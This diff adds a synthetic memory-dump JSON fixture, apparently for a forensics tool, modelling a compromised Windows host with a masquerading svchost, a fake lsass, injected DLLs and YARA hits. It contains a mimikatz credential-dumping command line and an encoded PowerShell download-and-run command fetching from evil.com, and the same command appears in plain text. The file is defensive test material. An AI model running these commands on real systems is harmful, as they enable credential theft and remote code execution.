@@ -1,0 +1,117 @@
+{
+  "dump_path": "examples/sample_dump.json",
+  "os_profile": "Win10x64_19041",
+
+  "processes": [
+    {"pid": 4, "ppid": 0, "name": "System", "path": "", "cmdline": "", "create_time": "2026-04-10T08:00:00Z", "threads": 180, "handles": 2400},
+    {"pid": 348, "ppid": 4, "name": "smss.exe", "path": "C:\\Windows\\System32\\smss.exe", "cmdline": "\\SystemRoot\\System32\\smss.exe", "create_time": "2026-04-10T08:00:01Z", "threads": 2, "handles": 53},
+    {"pid": 452, "ppid": 348, "name": "csrss.exe", "path": "C:\\Windows\\System32\\csrss.exe", "cmdline": "%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows", "create_time": "2026-04-10T08:00:02Z", "threads": 14, "handles": 600},
+    {"pid": 528, "ppid": 348, "name": "wininit.exe", "path": "C:\\Windows\\System32\\wininit.exe", "cmdline": "wininit.exe", "create_time": "2026-04-10T08:00:02Z", "threads": 1, "handles": 78},
+    {"pid": 596, "ppid": 528, "name": "services.exe", "path": "C:\\Windows\\System32\\services.exe", "cmdline": "C:\\Windows\\system32\\services.exe", "create_time": "2026-04-10T08:00:03Z", "threads": 6, "handles": 310},
+    {"pid": 604, "ppid": 528, "name": "lsass.exe", "path": "C:\\Windows\\System32\\lsass.exe", "cmdline": "C:\\Windows\\system32\\lsass.exe", "create_time": "2026-04-10T08:00:03Z", "threads": 8, "handles": 850},
+    {"pid": 780, "ppid": 596, "name": "svchost.exe", "path": "C:\\Windows\\System32\\svchost.exe", "cmdline": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p", "create_time": "2026-04-10T08:00:04Z", "threads": 22, "handles": 560},
+    {"pid": 880, "ppid": 596, "name": "svchost.exe", "path": "C:\\Windows\\System32\\svchost.exe", "cmdline": "C:\\Windows\\system32\\svchost.exe -k RPCSS -p", "create_time": "2026-04-10T08:00:04Z", "threads": 10, "handles": 310},
+    {"pid": 2100, "ppid": 780, "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe", "cmdline": "C:\\Windows\\Explorer.EXE", "create_time": "2026-04-10T08:01:00Z", "threads": 40, "handles": 1500},
+    {"pid": 3340, "ppid": 2100, "name": "chrome.exe", "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "cmdline": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"", "create_time": "2026-04-10T08:15:00Z", "threads": 30, "handles": 800},
+
+    {"pid": 4444, "ppid": 2100, "name": "svchost.exe", "path": "C:\\Users\\analyst\\AppData\\Local\\Temp\\svchost.exe", "cmdline": "C:\\Users\\analyst\\AppData\\Local\\Temp\\svchost.exe -connect 45.33.32.156:4444", "create_time": "2026-04-10T09:30:00Z", "threads": 3, "handles": 45, "suspicious_flags": ["wrong_path", "suspicious_port"]},
+    {"pid": 4500, "ppid": 4444, "name": "cmd.exe", "path": "C:\\Windows\\System32\\cmd.exe", "cmdline": "cmd.exe /c whoami && net user && net localgroup administrators", "create_time": "2026-04-10T09:30:05Z", "threads": 1, "handles": 20},
+    {"pid": 4550, "ppid": 4444, "name": "mimikatz.exe", "path": "C:\\Users\\analyst\\Desktop\\mimikatz.exe", "cmdline": "mimikatz.exe \"sekurlsa::logonpasswords\" exit", "create_time": "2026-04-10T09:31:00Z", "threads": 2, "handles": 30, "suspicious_flags": ["known_offensive_tool"]},
+    {"pid": 4600, "ppid": 4444, "name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "cmdline": "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA", "create_time": "2026-04-10T09:32:00Z", "threads": 5, "handles": 200},
+
+    {"pid": 5000, "ppid": 1, "name": "lsass.exe", "path": "C:\\Users\\Public\\lsass.exe", "cmdline": "C:\\Users\\Public\\lsass.exe", "create_time": "2026-04-10T09:35:00Z", "threads": 1, "handles": 15, "suspicious_flags": ["duplicate_system_process", "wrong_path"]}
+  ],
+
+  "hidden_pids": [6666],
+
+  "connections": [
+    {"local_addr": "192.168.1.100", "local_port": 49152, "remote_addr": "142.250.80.46", "remote_port": 443, "state": "ESTABLISHED", "protocol": "TCP", "pid": 3340, "process_name": "chrome.exe"},
+    {"local_addr": "192.168.1.100", "local_port": 49153, "remote_addr": "142.250.80.46", "remote_port": 443, "state": "ESTABLISHED", "protocol": "TCP", "pid": 3340, "process_name": "chrome.exe"},
+
+    {"local_addr": "192.168.1.100", "local_port": 49200, "remote_addr": "45.33.32.156", "remote_port": 4444, "state": "ESTABLISHED", "protocol": "TCP", "pid": 4444, "process_name": "svchost.exe"},
+    {"local_addr": "192.168.1.100", "local_port": 49201, "remote_addr": "185.220.101.42", "remote_port": 8080, "state": "ESTABLISHED", "protocol": "TCP", "pid": 4444, "process_name": "svchost.exe"},
+
+    {"local_addr": "192.168.1.100", "local_port": 49210, "remote_addr": "91.215.85.209", "remote_port": 443, "state": "ESTABLISHED", "protocol": "TCP", "pid": 4600, "process_name": "powershell.exe"},
+
+    {"local_addr": "192.168.1.100", "local_port": 49300, "remote_addr": "23.129.64.200", "remote_port": 9001, "state": "ESTABLISHED", "protocol": "TCP", "pid": 5000, "process_name": "lsass.exe"},
+
+    {"local_addr": "0.0.0.0", "local_port": 54321, "remote_addr": "0.0.0.0", "remote_port": 0, "state": "LISTENING", "protocol": "TCP", "pid": 4444, "process_name": "svchost.exe"}
+  ],
+
+  "memory_regions": [
+    {"pid": 4444, "process_name": "svchost.exe", "address": "0x7FFE0000", "size": 65536, "protection": "PAGE_EXECUTE_READWRITE", "content": "TVqQAAMAAAAEAAAA"},
+    {"pid": 4600, "process_name": "powershell.exe", "address": "0x00400000", "size": 4096, "protection": "RWX", "content": "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"}
+  ],
+
+  "hollowed_processes": [
+    {"pid": 4444, "name": "svchost.exe", "reason": "Image base mismatch: PEB base 0x00400000 != mapped base 0x7FFE0000"}
+  ],
+
+  "injected_dlls": [
+    {"pid": 604, "process_name": "lsass.exe", "dll_name": "evil.dll", "dll_path": "C:\\Users\\analyst\\AppData\\Local\\Temp\\evil.dll", "suspicious": true}
+  ],
+
+  "reflective_indicators": [
+    {"pid": 4444, "process_name": "svchost.exe", "indicator": "PE header (MZ) found in non-image VAD region", "address": "0x7FFE0000"}
+  ],
+
+  "handles": [
+    {"type": "Mutant", "name": "Global\\MSCTFMonitor_S-1-5-18", "pid": 4444, "process_name": "svchost.exe"},
+    {"type": "File", "name": "\\Device\\HarddiskVolume2\\Windows\\System32\\config\\SAM", "pid": 4550, "process_name": "mimikatz.exe"},
+    {"type": "File", "name": "\\Device\\HarddiskVolume2\\Windows\\NTDS\\ntds.dit", "pid": 4550, "process_name": "mimikatz.exe"},
+    {"type": "Key", "name": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "pid": 4444, "process_name": "svchost.exe"},
+    {"type": "File", "name": "\\Device\\HarddiskVolume2\\Users\\analyst\\.ssh\\id_rsa", "pid": 4444, "process_name": "svchost.exe"}
+  ],
+
+  "cross_process_handles": [
+    {"source_pid": 4550, "source_name": "mimikatz.exe", "target_pid": 604, "target_name": "lsass.exe", "access_rights": "PROCESS_VM_READ | PROCESS_QUERY_INFORMATION"}
+  ],
+
+  "yara_matches": [
+    {
+      "rule_name": "CredentialHarvesting",
+      "rule_file": "credentials.yar",
+      "description": "Credential harvesting tool indicators",
+      "tags": ["credentials"],
+      "severity": "critical",
+      "pid": 4550,
+      "process_name": "mimikatz.exe",
+      "offset": 8192,
+      "matched_strings": ["mimikatz", "sekurlsa", "logonpasswords"],
+      "metadata": {"author": "GhostForensics", "mitre_attack": "T1003"}
+    },
+    {
+      "rule_name": "MalwareStrings",
+      "rule_file": "malware_indicators.yar",
+      "description": "Common malware strings and API calls",
+      "tags": ["malware"],
+      "severity": "high",
+      "pid": 4444,
+      "process_name": "svchost.exe",
+      "offset": 4096,
+      "matched_strings": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"],
+      "metadata": {"author": "GhostForensics", "mitre_attack": "T1059"}
+    },
+    {
+      "rule_name": "RegistryPersistence",
+      "rule_file": "persistence.yar",
+      "description": "Registry-based persistence mechanisms",
+      "tags": ["persistence"],
+      "severity": "high",
+      "pid": 4444,
+      "process_name": "svchost.exe",
+      "offset": 16384,
+      "matched_strings": ["CurrentVersion\\Run"],
+      "metadata": {"author": "GhostForensics", "mitre_attack": "T1547.001"}
+    }
+  ],
+
+  "extracted_strings": [
+    "http://evil.com/payload.ps1",
+    "http://45.33.32.156:8080/beacon",
+    "admin@evil-corp.com",
+    "password=Sup3rS3cret!",
+    "Authorization: Basic YWRtaW46cGFzc3dvcmQ=",
+    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
+  ]
+}
